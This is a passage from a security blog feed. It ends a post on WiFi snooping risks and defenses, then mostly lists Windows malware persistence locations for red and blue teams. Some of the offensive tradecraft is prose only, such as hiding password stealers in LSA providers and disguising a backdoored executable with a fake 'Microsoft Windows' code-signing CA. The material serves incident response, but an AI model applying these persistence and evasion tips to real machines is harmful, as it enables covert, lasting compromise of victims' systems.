&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;To sum up, attackers on a WPA2-PSK network can:&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Decrypt all HTTP/FTP/IMAP/SMTP/POP3 passwords or other sensitive information&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Can launch active attacks like SSLStrip, or modify HTTP traffic to include exploit/social engineer attacks&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Can monitor/track user activity&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The only difference between open and WPA2-PSK networks is that an open network can be hacked with an attacker of the skill level of 1 from 10, while the WPA2-PSK network needs and an attacker with a skill level of 1.5. That is the difference.&lt;/div&gt;
&lt;h3&gt;The real solutions&lt;/h3&gt;
&lt;div style=&quot;&quot;&gt;1.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt;&lt;/span&gt;Website owners, service providers should deploy proper (trusted) SSL/TLS infrastructure, protect session cookies, etc. Whenever a user (or security professional) notices a problem with the quality of the service (e.g. missing SSL/TLS), the service provider has to be notified. If no change is made, it is recommended to drop the service provider and choose a more secure one. Users have to use HTTPS Everywhere plugin.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;2.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;Protect the device against exploits by patching the software on it, use a secure browser (Chrome, IE11 + enhanced protection), disable unnecessary plugins (Java, Flash, Silverlight), or at least use it via click-to-play. Also, the use of exploit mitigations tools (EMET, HitmanPro Alert, Malwarebytes AntiExploit) and a good internet security suite is a good idea.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;3.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;Website owners have to deploy &lt;a href=&quot;https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security&quot; target=&quot;_blank&quot;&gt;HSTS&lt;/a&gt;, and optionally include their site in an &lt;a href=&quot;https://hstspreload.appspot.com/&quot; target=&quot;_blank&quot;&gt;HSTS preload list&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;4.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;Don’t click blindly on fake downloads (like fake Flash Player updates)&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/scandesk.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/scandesk.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/scandesk.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;5.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;The benefits of a VPN is usually overestimated. A VPN provider is just another provider, like the hotspot provider, or the ISP. They can do the same malicious stuff (traffic injecting, traffic monitoring, user tracking). Especially when people use free VPNs. And “Average Joe” will choose a free VPN. Also, VPN connections tend to be disconnected, and almost none of the VPN providers provide fail secure VPNs. Also, for the price of a good VPN service you can buy a good data plan and use 4G/3G instead of low-quality public hotspots. But besides this, on mobile OSes (Android, iOS, etc.) I strongly recommend the use of VPN, because it is not practically feasible to know for users which app is using SSL/TLS and which is not.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;6.&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;Use a location-aware firewall, and whenever the network is not trusted, set it to a Public.&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/2251.clip_image001_627A00E5.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/2251.clip_image001_627A00E5.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/2251.clip_image001_627A00E5.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;7. In a small-business/home environment, buy a WiFi router with guest WiFi access possibility, where the different passwords can be set to guest networks than used for the other.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Asking the question “Are you using open WiFi?”, or “Do you do online banking on open WiFi?” are the wrong questions. The good questions are:&lt;/div&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Do you trust the operator(s) of the network you are using?&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Are the clients separated?&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;If clients are not separated, is it possible that there are people with malicious intent on the network?&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Are you security-aware, and are you following the rules previously mentioned? If you do follow these rules, those will protect you on whatever network you are.&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;And call me an idiot, but I do online banking, e-shopping, and all the other sensitive stuff while I’m using open WiFi. And whenever I order pizza from an HTTP website, attackers can learn my address. Which is already in the phone book, on Facebook, and in every photo metadata I took with my smartphone about my cat and uploaded to the Internet (&lt;a href=&quot;http://iknowwhereyourcatlives.com/&quot;&gt;http://iknowwhereyourcatlives.com/&lt;/a&gt;).&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/cat.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/cat.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/cat.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Most articles and research publications are full of FUD about what people can learn from others. Maybe they are just outdated, maybe they are not. But it is totally safe to use Gmail on an open WiFi, no one will be able to read my e-mails.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;PS: I know “Average Joe” won’t find my blog post, won’t start to read it, won’t understand half I wrote. But even if they do, they won’t patch their browser plugins, pay for a VPN, or check the session cookie. So they are doomed to fail. That’s life. Deal with it.&lt;/div&gt;
&lt;div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Many ways of malware persistence (that you were always afraid to ask)</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/malware/persistence/windows/2015/05/05/Many-ways-of-malware-persistence-(that-you-were-always-afraid-to-ask).html"/>
   <updated>2015-05-05T13:39:39+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/malware/persistence/windows/2015/05/05/Many-ways-of-malware-persistence-(that-you-were-always-afraid-to-ask)</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;TL;DR: Are you into red teaming? Need persistence? This post is not that long, read it ;)&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Are you into blue teaming? Have to find those pesky backdoors? This post is not that long, read it ;)&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;In the &lt;a href=&quot;http://jumpespjump.blogspot.com/2015/03/thousand-ways-to-backdoor-windows.html&quot; target=&quot;_blank&quot;&gt;previous post&lt;/a&gt;, I listed different ways how a Windows domain/forest can be backdoored. In this new post, I am digging a bit deeper, and list the most common/known ways malware can survive a reboot, just using local resources of the infected Windows system. The list is far from complete, and I would like to encourage everyone to comment on new methods, not yet listed here. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;From an incident response point of view, one of the best strategies to find malware on a suspicious system is to search for suspicious entries that start with the system. In the good old days, you had to check for 2-3 locations to cover 99% of the infections. Nowadays, there are a thousand ways malware can start. The common ones automatically start whenever Windows starts (or the user logs in), but some tricky ones are triggered by other events.&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Autoruns&lt;/h2&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;My favorite choice when it comes to malware persistence is Sysinternals tools, Autoruns. In this paragraph, I mainly quote the official built-in help, but bear with me, it is still interesting.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;On a side note, there are some problems with the Autoruns tool: it can only run on a live system. (EDIT: This is not true, Autoruns can analyze offline systems as well! Thanks to a comment from Justin.) And usually, this is not the case - I usually have dd images. And although VBoxManage can convert the dd images to VirtualBox disk image format, usually I don't have the time and storage to do that. This is where xmount awesomeness is here to rescue the day. It can convert dd and Encase images on-the-fly in-memory to Virtualbox format. Just attach the disk image to a new Virtualbox machine as the main boot HDD, modify the CPU/disk/controller settings until Windows starts instead of crashing, and voila, you can boot your forensic image - without modifying a single bit on the original evidence dd file. Another problem with malware analysis on a live system is that a good rootkit can fool the analyst easily. &lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;For quick wins, I usually filter out Microsoft entries, look for per-user locations only and check for unverified (missing or invalid Authenticode) executables. This usually helps to find 90% of malware easily. Especially if it has a color like purple or pink, it is highly suspicious. To find the rest, well, one has to dig deeper.&lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/zeus1.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/zeus1.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/zeus1.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Zeus &quot;hiding&quot; in the usual random directory - check the faked timestamp&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&quot;&quot;&gt;To implement &quot;poor-mans monitoring&quot;, regularly save the output of Autoruns, and during incident response, it will be highly valuable. Howto guide &lt;a href=&quot;http://www.sans.org/reading-room/whitepapers/malicious/utilizing-autoruns-catch-malware-33383&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Logon&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;This entry results in scans of standard autostart locations such as the Startup  folder for the current user and all users, the Run Registry keys, and standard  application launch locations.&quot; &lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;There are 42 registry keys/folders at the moment in Autoruns, which can be used to autostart a malware. The most common ways are the HKCU\Software\Microsoft\Windows\CurrentVersion\Run and the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup folder.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;One of my favorite regarding this topic is the &lt;a href=&quot;https://blog.gdatasoftware.com/blog/article/poweliks-the-persistent-malware-without-a-file.html&quot; target=&quot;_blank&quot;&gt;file-less Poweliks malware&lt;/a&gt;, 100% pure awesomeness. Typical ring 3 code execution.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Explorer&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;Select this entry to see Explorer shell extensions, browser helper objects, explorer toolbars, active setup executions, and shell execute hooks&quot;. 71 registry keys, OMG. Usually, this is not about auto-malware execution, but some of them might be a good place to hide malware.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Internet explorer&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;This entry shows Browser Helper Objects (BHO's), Internet Explorer toolbars and extensions&quot;. 13 registry key here. If a malicious BHO is installed into your browser, you are pretty much screwed.&lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;img align=&quot;middle&quot; border=&quot;0&quot; height=&quot;300&quot; src=&quot;https://z6543.github.io/_img/IE_pwn3d.jpg&quot; width=&quot;400&quot; /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Scheduled tasks&lt;/h3&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;Task scheduler tasks configured to start at boot or logon.&quot; Not commonly used, but it is important to look at this.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;I always thought this part of the autostart entries is quite boring, but nowadays, I think it is one of the best ways to hide your malware. There are so many entries here by default, and some of them can use quite good tricks to trigger the start.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Did you know that you can create custom events that &lt;a href=&quot;http://blakhal0.blogspot.com/2015/03/windows-event-log-driven-back-doors.html&quot; target=&quot;_blank&quot;&gt;trigger on Windows event logs&lt;/a&gt;?&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Did you know you can create &lt;a href=&quot;http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html&quot; target=&quot;_blank&quot;&gt;malware persistence just by using Windows tools&lt;/a&gt; like bitsadmin and Scheduled tasks?&lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/sched2.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/sched2.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/sched2.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Scheduler in the old days&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/sched.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/sched.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/sched.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;Scheduler in the new days&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Services&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;HKLM\System\CurrentControlSet\Services&lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space: pre;&quot;&gt; &lt;/span&gt;is a very commonplace to hide malware, especially rootkits. Check all entries with special care.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Drivers&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Same as services. Very commonplace for rootkits. Unfortunately, signing a driver for 64-bit systems is not fun anymore, as it has to be signed by certificates that can be chained back to &quot;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/hardware/dn170454(v=vs.85).aspx&quot; target=&quot;_blank&quot;&gt;Software Publisher Certificates&lt;/a&gt;&quot;. Typical startup place for Ring 0 rootkits. &lt;/div&gt;&lt;div style=&quot;&quot;&gt;Starting from Windows 10, even this will change and all drivers have to be signed by &quot;&lt;a href=&quot;http://blogs.msdn.com/b/windows_hardware_certification/archive/2015/04/01/driver-signing-changes-in-windows-10.aspx&quot; target=&quot;_blank&quot;&gt;Windows Hardware Developer Center Dashboard portal&lt;/a&gt;&quot; and EV certificates.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Codecs&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;22 registry keys. Not very common, but possible code execution.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Boot execute&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;&quot;Native images (as opposed to Windows images) that run early during the boot process.&quot;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;5 registry keys here. Good place to hide a rootkit here.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Image hijacks&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;&quot;Image file execution options and command prompt autostarts.&quot; 13 registry key here. I believe this was supposed for debugging purposes originally.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;This is where the good-old sticky keys trick is hiding. It is a bit different from the others, as it provides a backdoor access, but you can only use this from the local network (usually). The trick is to execute your code whenever someone presses the SHIFT key multiple times before logging into RDP. The old way was to replace the sethc.exe, the new fun is to &lt;a href=&quot;http://www.labofapenetrationtester.com/2012/05/fun-with-sticky-keys-utilman-and.html&quot; target=&quot;_blank&quot;&gt;set a debug program on sethc&lt;/a&gt;. &lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/sethc.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/sethc.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/sethc.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;If you see this, you are in trouble&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;AppInit&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;&quot;This has Autoruns shows DLLs registered as application initialization DLLs.&quot; Only 3 registry keys here. This is the good old way to inject a malicious DLL into Explorer, browsers, etc. Luckily it is going to be deprecated soon.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Known DLLs&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;&quot;This reports the location of DLLs that Windows loads into applications that reference them.&quot; Only 1 registry key. This might be used to hijack some system DLLs.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Winlogon&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;&quot;Shows DLLs that register for Winlogon notification of logon events.&quot; 7 registry keys. Sometimes used by malware.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Winsock providers&lt;/h3&gt;&lt;div style=&quot;&quot;&gt;&quot;Shows registered Winsock protocols, including Winsock service providers. Malware often installs itself as a Winsock service provider because there are few tools that can remove them. Autoruns can disable them, but cannot delete them.&quot; 4 registry keys. AFAIK this was trendy a while ago. But still, a good place to hide malware.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Print monitors&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;Displays DLLs that load into the print spooling service. Malware has used this support to autostart itself.&quot; 1 registry key. Some malware writers are quite creative when it comes to hiding their persistence module.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;LSA providers&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;Shows registers Local Security Authority (LSA) authentication, notification and security packages.&quot; 5 registry keys. A good place to hide your password stealer. &lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Network providers&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;Missing documentation&quot;. If you have a good 1 sentence documentation, please comment.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;WMI filters&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;&quot;Missing documentation&quot;. Check &lt;a href=&quot;https://dl.mandiant.com/EE/library/MIRcon2014/MIRcon_2014_IR_Track_There's_Something_About_WMI.pdf&quot; target=&quot;_blank&quot;&gt;Mandiant &lt;/a&gt;for details.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Sidebar gadgets&lt;/h3&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Thank god MS disabled this a while ago :)&lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/coolest-best-latest-new-fun-tech-gadgets-sidebar-gadgets-2.jpg&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/coolest-best-latest-new-fun-tech-gadgets-sidebar-gadgets-2.jpg&quot; style=&quot;margin-left: auto; margin-right: auto;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/coolest-best-latest-new-fun-tech-gadgets-sidebar-gadgets-2.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;tr-caption&quot; style=&quot;text-align: center;&quot;&gt;We all miss you, you crappy resource gobble nightmares&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;h2&gt;&lt;/h2&gt;&lt;h2&gt;&lt;/h2&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Common ways - not in autoruns&lt;/h2&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Now, let's see other possibilities to start your malware, which won't be listed in Sysinternals Autoruns.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;&lt;/h3&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;Backdoor an executable/DLL&lt;/h3&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&quot;&quot;&gt;Just change the code of an executable which is either auto-starting or commonly started by the user. To avoid lame mistakes, disable the update of the file ... &lt;a href=&quot;https://github.com/secretsquirrel/the-backdoor-factory&quot; target=&quot;_blank&quot;&gt;The backdoor factory&lt;/a&gt; is a good source for this task. But if you backdoor an executable/DLL which is already in Autoruns listed, you will break the Digital Signature on the file. It is recommended to sign your executable, and if you can't afford to steal a trusted certificate, you can still import your own CA into the user's trusted certificate store (with user privileges), and it will look like a trusted one. Protip: Use &quot;Microsoft Windows&quot; as the codesigner CA, and your executable will blend in.&lt;/div&gt;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tr-caption-container&quot; style=&quot;margin-left: auto; margin-right: auto; text-align: center;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/cert3.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/cert3.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img align=&quot;middle&quot; border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/cert3.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/certs.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/certs.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img align=&quot;middle&quot; border=&quot;0&quot; height=&quot;&quot; 